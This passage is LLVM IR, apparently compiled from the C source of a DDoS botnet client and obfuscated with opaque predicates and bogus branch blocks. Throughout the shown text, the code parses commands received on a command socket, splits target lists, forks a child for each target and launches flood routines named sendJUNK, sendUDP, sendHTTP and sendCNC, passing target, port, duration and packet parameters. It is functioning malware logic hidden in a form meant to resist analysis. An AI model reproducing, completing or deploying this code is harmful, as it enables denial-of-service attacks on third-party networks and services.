; <label>:374:                                    ; preds = %originalBBpart244
  %375 = load i8**, i8*** %4, align 8
  %376 = getelementptr inbounds i8*, i8** %375, i64 2
  %377 = load i8*, i8** %376, align 8
  %378 = call i32 @atoi(i8* %377) #10
  %379 = icmp slt i32 %378, 1
  br i1 %379, label %402, label %380

; <label>:380:                                    ; preds = %374
  %381 = load i32, i32* @x.79
  %382 = load i32, i32* @y.80
  %383 = sub i32 %381, 1
  %384 = mul i32 %381, %383
  %385 = urem i32 %384, 2
  %386 = icmp eq i32 %385, 0
  %387 = icmp slt i32 %382, 10
  %388 = or i1 %386, %387
  br i1 %388, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %380
  %389 = load i8**, i8*** %4, align 8
  %390 = getelementptr inbounds i8*, i8** %389, i64 3
  %391 = load i8*, i8** %390, align 8
  %392 = call i32 @atoi(i8* %391) #10
  %393 = icmp slt i32 %392, 1
  %394 = load i32, i32* @x.79
  %395 = load i32, i32* @y.80
  %396 = sub i32 %394, 1
  %397 = mul i32 %394, %396
  %398 = urem i32 %397, 2
  %399 = icmp eq i32 %398, 0
  %400 = icmp slt i32 %395, 10
  %401 = or i1 %399, %400
  br i1 %401, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %393, label %402, label %403

; <label>:402:                                    ; preds = %originalBBpart248, %374, %originalBBpart244
  br label %1413

; <label>:403:                                    ; preds = %originalBBpart248
  %404 = load i8**, i8*** %4, align 8
  %405 = getelementptr inbounds i8*, i8** %404, i64 1
  %406 = load i8*, i8** %405, align 8
  store i8* %406, i8** %11, align 8
  %407 = load i8**, i8*** %4, align 8
  %408 = getelementptr inbounds i8*, i8** %407, i64 2
  %409 = load i8*, i8** %408, align 8
  %410 = call i32 @atoi(i8* %409) #10
  store i32 %410, i32* %12, align 4
  %411 = load i8**, i8*** %4, align 8
  %412 = getelementptr inbounds i8*, i8** %411, i64 3
  %413 = load i8*, i8** %412, align 8
  %414 = call i32 @atoi(i8* %413) #10
  store i32 %414, i32* %13, align 4
  %415 = load i8*, i8** %11, align 8
  %416 = call i8* @strstr(i8* %415, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #10
  %417 = icmp ne i8* %416, null
  br i1 %417, label %418, label %468

; <label>:418:                                    ; preds = %403
  %419 = load i8*, i8** %11, align 8
  %420 = call i8* @strtok(i8* %419, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %420, i8** %14, align 8
  br label %421

; <label>:421:                                    ; preds = %originalBBpart256, %418
  %422 = load i8*, i8** %14, align 8
  %423 = icmp ne i8* %422, null
  br i1 %423, label %424, label %467

; <label>:424:                                    ; preds = %421
  %425 = call i32 @listFork()
  %426 = icmp ne i32 %425, 0
  br i1 %426, label %449, label %427

; <label>:427:                                    ; preds = %424
  %428 = load i32, i32* @x.79
  %429 = load i32, i32* @y.80
  %430 = sub i32 %428, 1
  %431 = mul i32 %428, %430
  %432 = urem i32 %431, 2
  %433 = icmp eq i32 %432, 0
  %434 = icmp slt i32 %429, 10
  %435 = or i1 %433, %434
  br i1 %435, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %427
  %436 = load i8*, i8** %14, align 8
  %437 = load i32, i32* %12, align 4
  %438 = load i32, i32* %13, align 4
  call void @sendJUNK(i8* %436, i32 %437, i32 %438)
  %439 = load i32, i32* @mainCommSock, align 4
  %440 = call i32 @close(i32 %439)
  call void @_exit(i32 0) #12
  %441 = load i32, i32* @x.79
  %442 = load i32, i32* @y.80
  %443 = sub i32 %441, 1
  %444 = mul i32 %441, %443
  %445 = urem i32 %444, 2
  %446 = icmp eq i32 %445, 0
  %447 = icmp slt i32 %442, 10
  %448 = or i1 %446, %447
  br i1 %448, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  unreachable

; <label>:449:                                    ; preds = %424
  %450 = load i32, i32* @x.79
  %451 = load i32, i32* @y.80
  %452 = sub i32 %450, 1
  %453 = mul i32 %450, %452
  %454 = urem i32 %453, 2
  %455 = icmp eq i32 %454, 0
  %456 = icmp slt i32 %451, 10
  %457 = or i1 %455, %456
  br i1 %457, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %449
  %458 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %458, i8** %14, align 8
  %459 = load i32, i32* @x.79
  %460 = load i32, i32* @y.80
  %461 = sub i32 %459, 1
  %462 = mul i32 %459, %461
  %463 = urem i32 %462, 2
  %464 = icmp eq i32 %463, 0
  %465 = icmp slt i32 %460, 10
  %466 = or i1 %464, %465
  br i1 %466, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br label %421

; <label>:467:                                    ; preds = %421
  br label %476

; <label>:468:                                    ; preds = %403
  %469 = call i32 @listFork()
  %470 = icmp ne i32 %469, 0
  br i1 %470, label %471, label %472

; <label>:471:                                    ; preds = %468
  br label %1413

; <label>:472:                                    ; preds = %468
  %473 = load i8*, i8** %11, align 8
  %474 = load i32, i32* %12, align 4
  %475 = load i32, i32* %13, align 4
  call void @sendJUNK(i8* %473, i32 %474, i32 %475)
  call void @_exit(i32 0) #12
  unreachable

; <label>:476:                                    ; preds = %467
  br label %477

; <label>:477:                                    ; preds = %476, %originalBBpart240
  %478 = load i8**, i8*** %4, align 8
  %479 = getelementptr inbounds i8*, i8** %478, i64 0
  %480 = load i8*, i8** %479, align 8
  %481 = call i32 @strcmp(i8* %480, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.101, i32 0, i32 0)) #10
  %482 = icmp ne i32 %481, 0
  br i1 %482, label %692, label %483

; <label>:483:                                    ; preds = %477
  %484 = load i32, i32* %3, align 4
  %485 = icmp slt i32 %484, 6
  br i1 %485, label %567, label %486

; <label>:486:                                    ; preds = %483
  %487 = load i32, i32* @x.79
  %488 = load i32, i32* @y.80
  %489 = sub i32 %487, 1
  %490 = mul i32 %487, %489
  %491 = urem i32 %490, 2
  %492 = icmp eq i32 %491, 0
  %493 = icmp slt i32 %488, 10
  %494 = or i1 %492, %493
  br i1 %494, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %486
  %495 = load i8**, i8*** %4, align 8
  %496 = getelementptr inbounds i8*, i8** %495, i64 3
  %497 = load i8*, i8** %496, align 8
  %498 = call i32 @atoi(i8* %497) #10
  %499 = icmp eq i32 %498, -1
  %500 = load i32, i32* @x.79
  %501 = load i32, i32* @y.80
  %502 = sub i32 %500, 1
  %503 = mul i32 %500, %502
  %504 = urem i32 %503, 2
  %505 = icmp eq i32 %504, 0
  %506 = icmp slt i32 %501, 10
  %507 = or i1 %505, %506
  br i1 %507, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br i1 %499, label %567, label %508

; <label>:508:                                    ; preds = %originalBBpart260
  %509 = load i32, i32* @x.79
  %510 = load i32, i32* @y.80
  %511 = sub i32 %509, 1
  %512 = mul i32 %509, %511
  %513 = urem i32 %512, 2
  %514 = icmp eq i32 %513, 0
  %515 = icmp slt i32 %510, 10
  %516 = or i1 %514, %515
  br i1 %516, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %508
  %517 = load i8**, i8*** %4, align 8
  %518 = getelementptr inbounds i8*, i8** %517, i64 2
  %519 = load i8*, i8** %518, align 8
  %520 = call i32 @atoi(i8* %519) #10
  %521 = icmp eq i32 %520, -1
  %522 = load i32, i32* @x.79
  %523 = load i32, i32* @y.80
  %524 = sub i32 %522, 1
  %525 = mul i32 %522, %524
  %526 = urem i32 %525, 2
  %527 = icmp eq i32 %526, 0
  %528 = icmp slt i32 %523, 10
  %529 = or i1 %527, %528
  br i1 %529, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %521, label %567, label %530

; <label>:530:                                    ; preds = %originalBBpart264
  %531 = load i8**, i8*** %4, align 8
  %532 = getelementptr inbounds i8*, i8** %531, i64 4
  %533 = load i8*, i8** %532, align 8
  %534 = call i32 @atoi(i8* %533) #10
  %535 = icmp eq i32 %534, -1
  br i1 %535, label %567, label %536

; <label>:536:                                    ; preds = %530
  %537 = load i8**, i8*** %4, align 8
  %538 = getelementptr inbounds i8*, i8** %537, i64 4
  %539 = load i8*, i8** %538, align 8
  %540 = call i32 @atoi(i8* %539) #10
  %541 = icmp sgt i32 %540, 1024
  br i1 %541, label %567, label %542

; <label>:542:                                    ; preds = %536
  %543 = load i32, i32* @x.79
  %544 = load i32, i32* @y.80
  %545 = sub i32 %543, 1
  %546 = mul i32 %543, %545
  %547 = urem i32 %546, 2
  %548 = icmp eq i32 %547, 0
  %549 = icmp slt i32 %544, 10
  %550 = or i1 %548, %549
  br i1 %550, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %542
  %551 = load i32, i32* %3, align 4
  %552 = icmp eq i32 %551, 6
  %553 = load i32, i32* @x.79
  %554 = load i32, i32* @y.80
  %555 = sub i32 %553, 1
  %556 = mul i32 %553, %555
  %557 = urem i32 %556, 2
  %558 = icmp eq i32 %557, 0
  %559 = icmp slt i32 %554, 10
  %560 = or i1 %558, %559
  br i1 %560, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %552, label %561, label %568

; <label>:561:                                    ; preds = %originalBBpart268
  %562 = load i8**, i8*** %4, align 8
  %563 = getelementptr inbounds i8*, i8** %562, i64 5
  %564 = load i8*, i8** %563, align 8
  %565 = call i32 @atoi(i8* %564) #10
  %566 = icmp slt i32 %565, 1
  br i1 %566, label %567, label %568

; <label>:567:                                    ; preds = %561, %536, %530, %originalBBpart264, %originalBBpart260, %483
  br label %1413

; <label>:568:                                    ; preds = %561, %originalBBpart268
  %569 = load i32, i32* @x.79
  %570 = load i32, i32* @y.80
  %571 = sub i32 %569, 1
  %572 = mul i32 %569, %571
  %573 = urem i32 %572, 2
  %574 = icmp eq i32 %573, 0
  %575 = icmp slt i32 %570, 10
  %576 = or i1 %574, %575
  br i1 %576, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %568
  %577 = load i8**, i8*** %4, align 8
  %578 = getelementptr inbounds i8*, i8** %577, i64 1
  %579 = load i8*, i8** %578, align 8
  store i8* %579, i8** %15, align 8
  %580 = load i8**, i8*** %4, align 8
  %581 = getelementptr inbounds i8*, i8** %580, i64 2
  %582 = load i8*, i8** %581, align 8
  %583 = call i32 @atoi(i8* %582) #10
  store i32 %583, i32* %16, align 4
  %584 = load i8**, i8*** %4, align 8
  %585 = getelementptr inbounds i8*, i8** %584, i64 3
  %586 = load i8*, i8** %585, align 8
  %587 = call i32 @atoi(i8* %586) #10
  store i32 %587, i32* %17, align 4
  %588 = load i8**, i8*** %4, align 8
  %589 = getelementptr inbounds i8*, i8** %588, i64 4
  %590 = load i8*, i8** %589, align 8
  %591 = call i32 @atoi(i8* %590) #10
  store i32 %591, i32* %18, align 4
  %592 = load i32, i32* %3, align 4
  %593 = icmp eq i32 %592, 6
  %594 = load i32, i32* @x.79
  %595 = load i32, i32* @y.80
  %596 = sub i32 %594, 1
  %597 = mul i32 %594, %596
  %598 = urem i32 %597, 2
  %599 = icmp eq i32 %598, 0
  %600 = icmp slt i32 %595, 10
  %601 = or i1 %599, %600
  br i1 %601, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br i1 %593, label %602, label %623

; <label>:602:                                    ; preds = %originalBBpart272
  %603 = load i32, i32* @x.79
  %604 = load i32, i32* @y.80
  %605 = sub i32 %603, 1
  %606 = mul i32 %603, %605
  %607 = urem i32 %606, 2
  %608 = icmp eq i32 %607, 0
  %609 = icmp slt i32 %604, 10
  %610 = or i1 %608, %609
  br i1 %610, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %602
  %611 = load i8**, i8*** %4, align 8
  %612 = getelementptr inbounds i8*, i8** %611, i64 5
  %613 = load i8*, i8** %612, align 8
  %614 = call i32 @atoi(i8* %613) #10
  %615 = load i32, i32* @x.79
  %616 = load i32, i32* @y.80
  %617 = sub i32 %615, 1
  %618 = mul i32 %615, %617
  %619 = urem i32 %618, 2
  %620 = icmp eq i32 %619, 0
  %621 = icmp slt i32 %616, 10
  %622 = or i1 %620, %621
  br i1 %622, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br label %640

; <label>:623:                                    ; preds = %originalBBpart272
  %624 = load i32, i32* @x.79
  %625 = load i32, i32* @y.80
  %626 = sub i32 %624, 1
  %627 = mul i32 %624, %626
  %628 = urem i32 %627, 2
  %629 = icmp eq i32 %628, 0
  %630 = icmp slt i32 %625, 10
  %631 = or i1 %629, %630
  br i1 %631, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %623
  %632 = load i32, i32* @x.79
  %633 = load i32, i32* @y.80
  %634 = sub i32 %632, 1
  %635 = mul i32 %632, %634
  %636 = urem i32 %635, 2
  %637 = icmp eq i32 %636, 0
  %638 = icmp slt i32 %633, 10
  %639 = or i1 %637, %638
  br i1 %639, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br label %640

; <label>:640:                                    ; preds = %originalBBpart280, %originalBBpart276
  %641 = phi i32 [ %614, %originalBBpart276 ], [ 10, %originalBBpart280 ]
  store i32 %641, i32* %19, align 4
  store i32 32, i32* %20, align 4
  %642 = load i8*, i8** %15, align 8
  %643 = call i8* @strstr(i8* %642, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #10
  %644 = icmp ne i8* %643, null
  br i1 %644, label %645, label %680

; <label>:645:                                    ; preds = %640
  %646 = load i8*, i8** %15, align 8
  %647 = call i8* @strtok(i8* %646, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %647, i8** %21, align 8
  br label %648

; <label>:648:                                    ; preds = %677, %645
  %649 = load i8*, i8** %21, align 8
  %650 = icmp ne i8* %649, null
  br i1 %650, label %651, label %679

; <label>:651:                                    ; preds = %648
  %652 = call i32 @listFork()
  %653 = icmp ne i32 %652, 0
  br i1 %653, label %677, label %654

; <label>:654:                                    ; preds = %651
  %655 = load i32, i32* @x.79
  %656 = load i32, i32* @y.80
  %657 = sub i32 %655, 1
  %658 = mul i32 %655, %657
  %659 = urem i32 %658, 2
  %660 = icmp eq i32 %659, 0
  %661 = icmp slt i32 %656, 10
  %662 = or i1 %660, %661
  br i1 %662, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %654
  %663 = load i8*, i8** %21, align 8
  %664 = load i32, i32* %16, align 4
  %665 = load i32, i32* %17, align 4
  %666 = load i32, i32* %18, align 4
  %667 = load i32, i32* %19, align 4
  %668 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %663, i32 %664, i32 %665, i32 %666, i32 %667, i32 %668)
  call void @_exit(i32 0) #12
  %669 = load i32, i32* @x.79
  %670 = load i32, i32* @y.80
  %671 = sub i32 %669, 1
  %672 = mul i32 %669, %671
  %673 = urem i32 %672, 2
  %674 = icmp eq i32 %673, 0
  %675 = icmp slt i32 %670, 10
  %676 = or i1 %674, %675
  br i1 %676, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  unreachable

; <label>:677:                                    ; preds = %651
  %678 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %678, i8** %21, align 8
  br label %648

; <label>:679:                                    ; preds = %648
  br label %691

; <label>:680:                                    ; preds = %640
  %681 = call i32 @listFork()
  %682 = icmp ne i32 %681, 0
  br i1 %682, label %683, label %684

; <label>:683:                                    ; preds = %680
  br label %1413

; <label>:684:                                    ; preds = %680
  %685 = load i8*, i8** %15, align 8
  %686 = load i32, i32* %16, align 4
  %687 = load i32, i32* %17, align 4
  %688 = load i32, i32* %18, align 4
  %689 = load i32, i32* %19, align 4
  %690 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %685, i32 %686, i32 %687, i32 %688, i32 %689, i32 %690)
  call void @_exit(i32 0) #12
  unreachable

; <label>:691:                                    ; preds = %679
  br label %692

; <label>:692:                                    ; preds = %691, %477
  %693 = load i8**, i8*** %4, align 8
  %694 = getelementptr inbounds i8*, i8** %693, i64 0
  %695 = load i8*, i8** %694, align 8
  %696 = call i32 @strcmp(i8* %695, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.102, i32 0, i32 0)) #10
  %697 = icmp ne i32 %696, 0
  br i1 %697, label %773, label %698

; <label>:698:                                    ; preds = %692
  %699 = load i32, i32* %3, align 4
  %700 = icmp slt i32 %699, 6
  br i1 %700, label %729, label %701

; <label>:701:                                    ; preds = %698
  %702 = load i8**, i8*** %4, align 8
  %703 = getelementptr inbounds i8*, i8** %702, i64 3
  %704 = load i8*, i8** %703, align 8
  %705 = call i32 @atoi(i8* %704) #10
  %706 = icmp slt i32 %705, 1
  br i1 %706, label %729, label %707

; <label>:707:                                    ; preds = %701
  %708 = load i32, i32* @x.79
  %709 = load i32, i32* @y.80
  %710 = sub i32 %708, 1
  %711 = mul i32 %708, %710
  %712 = urem i32 %711, 2
  %713 = icmp eq i32 %712, 0
  %714 = icmp slt i32 %709, 10
  %715 = or i1 %713, %714
  br i1 %715, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %707
  %716 = load i8**, i8*** %4, align 8
  %717 = getelementptr inbounds i8*, i8** %716, i64 5
  %718 = load i8*, i8** %717, align 8
  %719 = call i32 @atoi(i8* %718) #10
  %720 = icmp slt i32 %719, 1
  %721 = load i32, i32* @x.79
  %722 = load i32, i32* @y.80
  %723 = sub i32 %721, 1
  %724 = mul i32 %721, %723
  %725 = urem i32 %724, 2
  %726 = icmp eq i32 %725, 0
  %727 = icmp slt i32 %722, 10
  %728 = or i1 %726, %727
  br i1 %728, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br i1 %720, label %729, label %730

; <label>:729:                                    ; preds = %originalBBpart288, %701, %698
  br label %1413

; <label>:730:                                    ; preds = %originalBBpart288
  %731 = call i32 @listFork()
  %732 = icmp ne i32 %731, 0
  br i1 %732, label %733, label %750

; <label>:733:                                    ; preds = %730
  %734 = load i32, i32* @x.79
  %735 = load i32, i32* @y.80
  %736 = sub i32 %734, 1
  %737 = mul i32 %734, %736
  %738 = urem i32 %737, 2
  %739 = icmp eq i32 %738, 0
  %740 = icmp slt i32 %735, 10
  %741 = or i1 %739, %740
  br i1 %741, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %733
  %742 = load i32, i32* @x.79
  %743 = load i32, i32* @y.80
  %744 = sub i32 %742, 1
  %745 = mul i32 %742, %744
  %746 = urem i32 %745, 2
  %747 = icmp eq i32 %746, 0
  %748 = icmp slt i32 %743, 10
  %749 = or i1 %747, %748
  br i1 %749, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br label %1413

; <label>:750:                                    ; preds = %730
  %751 = load i8**, i8*** %4, align 8
  %752 = getelementptr inbounds i8*, i8** %751, i64 1
  %753 = load i8*, i8** %752, align 8
  %754 = load i8**, i8*** %4, align 8
  %755 = getelementptr inbounds i8*, i8** %754, i64 2
  %756 = load i8*, i8** %755, align 8
  %757 = load i8**, i8*** %4, align 8
  %758 = getelementptr inbounds i8*, i8** %757, i64 3
  %759 = load i8*, i8** %758, align 8
  %760 = call i32 @atoi(i8* %759) #10
  %761 = trunc i32 %760 to i16
  %762 = load i8**, i8*** %4, align 8
  %763 = getelementptr inbounds i8*, i8** %762, i64 4
  %764 = load i8*, i8** %763, align 8
  %765 = load i8**, i8*** %4, align 8
  %766 = getelementptr inbounds i8*, i8** %765, i64 5
  %767 = load i8*, i8** %766, align 8
  %768 = call i32 @atoi(i8* %767) #10
  %769 = load i8**, i8*** %4, align 8
  %770 = getelementptr inbounds i8*, i8** %769, i64 6
  %771 = load i8*, i8** %770, align 8
  %772 = call i32 @atoi(i8* %771) #10
  call void @sendHTTP(i8* %753, i8* %756, i16 zeroext %761, i8* %764, i32 %768, i32 %772)
  call void @exit(i32 0) #14
  unreachable

; <label>:773:                                    ; preds = %692
  %774 = load i8**, i8*** %4, align 8
  %775 = getelementptr inbounds i8*, i8** %774, i64 0
  %776 = load i8*, i8** %775, align 8
  %777 = call i32 @strcmp(i8* %776, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.103, i32 0, i32 0)) #10
  %778 = icmp ne i32 %777, 0
  br i1 %778, label %901, label %779

; <label>:779:                                    ; preds = %773
  %780 = load i32, i32* @x.79
  %781 = load i32, i32* @y.80
  %782 = sub i32 %780, 1
  %783 = mul i32 %780, %782
  %784 = urem i32 %783, 2
  %785 = icmp eq i32 %784, 0
  %786 = icmp slt i32 %781, 10
  %787 = or i1 %785, %786
  br i1 %787, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %779
  %788 = load i32, i32* %3, align 4
  %789 = icmp slt i32 %788, 4
  %790 = load i32, i32* @x.79
  %791 = load i32, i32* @y.80
  %792 = sub i32 %790, 1
  %793 = mul i32 %790, %792
  %794 = urem i32 %793, 2
  %795 = icmp eq i32 %794, 0
  %796 = icmp slt i32 %791, 10
  %797 = or i1 %795, %796
  br i1 %797, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br i1 %789, label %810, label %798

; <label>:798:                                    ; preds = %originalBBpart296
  %799 = load i8**, i8*** %4, align 8
  %800 = getelementptr inbounds i8*, i8** %799, i64 2
  %801 = load i8*, i8** %800, align 8
  %802 = call i32 @atoi(i8* %801) #10
  %803 = icmp slt i32 %802, 1
  br i1 %803, label %810, label %804

; <label>:804:                                    ; preds = %798
  %805 = load i8**, i8*** %4, align 8
  %806 = getelementptr inbounds i8*, i8** %805, i64 3
  %807 = load i8*, i8** %806, align 8
  %808 = call i32 @atoi(i8* %807) #10
  %809 = icmp slt i32 %808, 1
  br i1 %809, label %810, label %811

; <label>:810:                                    ; preds = %804, %798, %originalBBpart296
  br label %1413

; <label>:811:                                    ; preds = %804
  %812 = load i8**, i8*** %4, align 8
  %813 = getelementptr inbounds i8*, i8** %812, i64 1
  %814 = load i8*, i8** %813, align 8
  store i8* %814, i8** %22, align 8
  %815 = load i8**, i8*** %4, align 8
  %816 = getelementptr inbounds i8*, i8** %815, i64 2
  %817 = load i8*, i8** %816, align 8
  %818 = call i32 @atoi(i8* %817) #10
  store i32 %818, i32* %23, align 4
  %819 = load i8**, i8*** %4, align 8
  %820 = getelementptr inbounds i8*, i8** %819, i64 3
  %821 = load i8*, i8** %820, align 8
  %822 = call i32 @atoi(i8* %821) #10
  store i32 %822, i32* %24, align 4
  %823 = load i8*, i8** %22, align 8
  %824 = call i8* @strstr(i8* %823, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #10
  %825 = icmp ne i8* %824, null
  br i1 %825, label %826, label %876

; <label>:826:                                    ; preds = %811
  %827 = load i8*, i8** %22, align 8
  %828 = call i8* @strtok(i8* %827, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %828, i8** %25, align 8
  br label %829

; <label>:829:                                    ; preds = %873, %826
  %830 = load i8*, i8** %25, align 8
  %831 = icmp ne i8* %830, null
  br i1 %831, label %832, label %875

; <label>:832:                                    ; preds = %829
  %833 = load i32, i32* @x.79
  %834 = load i32, i32* @y.80
  %835 = sub i32 %833, 1
  %836 = mul i32 %833, %835
  %837 = urem i32 %836, 2
  %838 = icmp eq i32 %837, 0
  %839 = icmp slt i32 %834, 10
  %840 = or i1 %838, %839
  br i1 %840, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %832
  %841 = call i32 @listFork()
  %842 = icmp ne i32 %841, 0
  %843 = load i32, i32* @x.79
  %844 = load i32, i32* @y.80
  %845 = sub i32 %843, 1
  %846 = mul i32 %843, %845
  %847 = urem i32 %846, 2
  %848 = icmp eq i32 %847, 0
  %849 = icmp slt i32 %844, 10
  %850 = or i1 %848, %849
  br i1 %850, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br i1 %842, label %873, label %851

; <label>:851:                                    ; preds = %originalBBpart2100
  %852 = load i32, i32* @x.79
  %853 = load i32, i32* @y.80
  %854 = sub i32 %852, 1
  %855 = mul i32 %852, %854
  %856 = urem i32 %855, 2
  %857 = icmp eq i32 %856, 0
  %858 = icmp slt i32 %853, 10
  %859 = or i1 %857, %858
  br i1 %859, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %851
  %860 = load i8*, i8** %25, align 8
  %861 = load i32, i32* %23, align 4
  %862 = load i32, i32* %24, align 4
  call void @sendCNC(i8* %860, i32 %861, i32 %862)
  %863 = load i32, i32* @mainCommSock, align 4
  %864 = call i32 @close(i32 %863)
  call void @_exit(i32 0) #12
  %865 = load i32, i32* @x.79
  %866 = load i32, i32* @y.80
  %867 = sub i32 %865, 1
  %868 = mul i32 %865, %867
  %869 = urem i32 %868, 2
  %870 = icmp eq i32 %869, 0
  %871 = icmp slt i32 %866, 10
  %872 = or i1 %870, %871
  br i1 %872, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  unreachable

; <label>:873:                                    ; preds = %originalBBpart2100
  %874 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %874, i8** %25, align 8
  br label %829

; <label>:875:                                    ; preds = %829
  br label %900

; <label>:876:                                    ; preds = %811
  %877 = call i32 @listFork()
  %878 = icmp ne i32 %877, 0
  br i1 %878, label %879, label %880

; <label>:879:                                    ; preds = %876
  br label %1413

; <label>:880:                                    ; preds = %876
  %881 = load i32, i32* @x.79
  %882 = load i32, i32* @y.80
  %883 = sub i32 %881, 1
  %884 = mul i32 %881, %883
  %885 = urem i32 %884, 2
  %886 = icmp eq i32 %885, 0
  %887 = icmp slt i32 %882, 10
  %888 = or i1 %886, %887
  br i1 %888, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %880
  %889 = load i8*, i8** %22, align 8
  %890 = load i32, i32* %23, align 4
  %891 = load i32, i32* %24, align 4
  call void @sendCNC(i8* %889, i32 %890, i32 %891)
  call void @_exit(i32 0) #12
  %892 = load i32, i32* @x.79
  %893 = load i32, i32* @y.80
  %894 = sub i32 %892, 1
  %895 = mul i32 %892, %894
  %896 = urem i32 %895, 2
  %897 = icmp eq i32 %896, 0
  %898 = icmp slt i32 %893, 10
  %899 = or i1 %897, %898
  br i1 %899, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  unreachable

; <label>:900:                                    ; preds = %875
  br label %901

; <label>:901:                                    ; preds = %900, %773
  %902 = load i32, i32* @x.79
  %903 = load i32, i32* @y.80
  %904 = sub i32 %902, 1
  %905 = mul i32 %902, %904
  %906 = urem i32 %905, 2
  %907 = icmp eq i32 %906, 0
  %908 = icmp slt i32 %903, 10
  %909 = or i1 %907, %908
  br i1 %909, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %901
  %910 = load i8**, i8*** %4, align 8
  %911 = getelementptr inbounds i8*, i8** %910, i64 0
  %912 = load i8*, i8** %911, align 8
  %913 = call i32 @strcmp(i8* %912, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.104, i32 0, i32 0)) #10
  %914 = icmp ne i32 %913, 0
  %915 = load i32, i32* @x.79
  %916 = load i32, i32* @y.80
  %917 = sub i32 %915, 1
  %918 = mul i32 %915, %917
  %919 = urem i32 %918, 2
  %920 = icmp eq i32 %919, 0
  %921 = icmp slt i32 %916, 10
  %922 = or i1 %920, %921
  br i1 %922, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br i1 %914, label %1035, label %923

; <label>:923:                                    ; preds = %originalBBpart2112
  %924 = load i32, i32* %3, align 4
  %925 = icmp slt i32 %924, 4
  br i1 %925, label %954, label %926

; <label>:926:                                    ; preds = %923
  %927 = load i8**, i8*** %4, align 8
  %928 = getelementptr inbounds i8*, i8** %927, i64 2
  %929 = load i8*, i8** %928, align 8
  %930 = call i32 @atoi(i8* %929) #10
  %931 = icmp slt i32 %930, 1
  br i1 %931, label %954, label %932

; <label>:932:                                    ; preds = %926
  %933 = load i32, i32* @x.79
  %934 = load i32, i32* @y.80
  %935 = sub i32 %933, 1
  %936 = mul i32 %933, %935
  %937 = urem i32 %936, 2
  %938 = icmp eq i32 %937, 0
  %939 = icmp slt i32 %934, 10
  %940 = or i1 %938, %939
  br i1 %940, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %932
  %941 = load i8**, i8*** %4, align 8
  %942 = getelementptr inbounds i8*, i8** %941, i64 3
  %943 = load i8*, i8** %942, align 8
  %944 = call i32 @atoi(i8* %943) #10
  %945 = icmp slt i32 %944, 1
